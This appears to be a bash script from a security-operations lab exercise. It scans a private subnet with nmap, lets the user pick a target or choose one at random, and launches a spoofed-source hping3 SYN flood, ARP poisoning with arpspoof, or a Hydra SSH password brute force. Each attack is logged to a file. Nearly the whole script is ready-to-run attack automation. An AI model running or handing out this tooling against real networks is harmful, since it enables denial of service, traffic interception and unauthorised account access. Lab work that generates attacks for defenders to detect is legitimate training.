#!/bin/bash

#set log

sgT=$(tz=Asia/Singapore date)
log_directory="/var/log"
log_file="/var/log/socProj.log"
sudo chmod 755 "$log_directory"

#set target range
targetRang="172.16.50.0/24"

#function to discover network

function netDiscovery()
{
	nmap -sn $targetRang -oG host.txt >/dev/null
	echo 'Availabe IP address:'
	cat host.txt | grep -Eo 'Host: [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' |cut -d ' ' -f2 > host2.txt
}
netDiscovery



#choose target IP or random to attack
cat host2.txt
echo -e "\nPlease enter an ip address from the list to attack, or enter Random for a random target"
read targetIP

if [ "$targetIP" == "Random" ]
	then
		targetIP2=$(shuf -n 1 host2.txt)
	else
		targetIP2=$targetIP
fi

echo -e "\nPreparing to attacking $targetIP2"



#check for possible attacks
sudo nmap $targetIP2 -Pn -oG nResult.txt >/dev/null
echo "$sgT : Nmap : $targetIP2" >> "$log_file"

avaPort=$(cat nResult.txt | grep Ports | awk -F/ '{print $1}' | awk '{print $NF}' )
canSSH=$(cat nResult.txt| grep 22)

String="The following attacks are avaliable to execute, A. Hping3 , B.Arpspoofing"
Sub="not"

#Check if port 22 is open
if [ "$canSSH" ]
then
	#echo "Able to do hydra"
	#echo $canSSH
	String="${String}, C. SSH hydra"
else
	String="${String}, C. SSH hydra- not avaliable"
fi
String="${String}, D. Random Attack"



#attack functions
function Hydssh()
{
	echo -e '\nBegining hydra attack'
	echo "$sgT : Hydra-SSH : $targetIP2" >> "$log_file"
	hydra -L user.txt -P pass.txt $targetIP2 ssh -vV
}

function Hping()
{
	echo -e "\nBegining DOS attack"
	echo "$sgT : Hping3 : $targetIP2" >> "$log_file"
	sudo hping3 -S $targetIP2 -p $avaPort -c 10 -a 215.14.123.1
	#sudo hping3 -S $targetIP2 -p $avaPort -c 10 -a 215.14.123.1 --flood
}

function ARPspfing()
{
	echo -e "\nStarting ARP poisoning"
	echo "$sgT : ARPSpoofing : $targetIP2" >> "$log_file"
	echo 1 > /proc/sys/net/ipv4/ip_forward
  	arpspoof -t $targetIP2 172.16.50.1
}

#Allow user to choose attack
echo -e "\n$String" | egrep --color "\b(not)\b|$"
echo 'Please choose an option:'
read OPTIONS

case $OPTIONS in
	A)
		Hping
	;;
	B)
		ARPspfing
	;;
	C)
		#if target Ip does not have port 22 open, let user know that it is not avaliable
		if [[ "$String" == *"$Sub"* ]]
		then
			#echo $String
			echo 'Attack not avaliable'
		else
			Hydssh
		fi
	;;
	D)
		#Random attack
		echo 'Random attack selected'
		random_options=$(( (RANDOM % 3) +1 ))
		case $random_options in
		1)
			Hping
			;;
		2)
			ARPspfing
			;;
		3)
			#if random attack choose hydra/option 3 while port 22 is close. choose again at random from other 2 options
			if [[ "$String" == *"$Sub"* ]]
			then
				opt=("opt1" "opt2")
				random_opt=$((RANDOM % ${#opt[@]}))
				selected_opt=${opt[$random_opt]}

				case $selected_opt in
				"opt1")
					Hping
					 ;;
				"opt2")
					ARPspfing
					;;
				esac
			else
				Hydssh
			fi
			;;
		esac
		;;

	*)
		echo 'Incorrect Input'
		exit
		;;
esac
